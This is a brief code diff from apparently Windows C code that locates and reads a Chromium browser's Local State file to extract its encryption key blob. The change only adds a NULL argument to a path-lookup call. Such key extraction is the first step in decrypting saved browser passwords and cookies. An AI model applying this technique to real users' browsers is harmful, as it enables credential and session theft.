@@ -44,7 +44,7 @@ static PBYTE ExtractKeyBlobFromLocalState(IN BROWSER_TYPE Browser, IN LPCSTR psz
 
     *pcbBlob = 0;
 
-    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPath, MAX_PATH))
+    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, NULL, szRelPath, MAX_PATH))
         return NULL;
 
     if (!BuildBrowserDataFilePath(Browser, szRelPath, szFullPath, MAX_PATH))
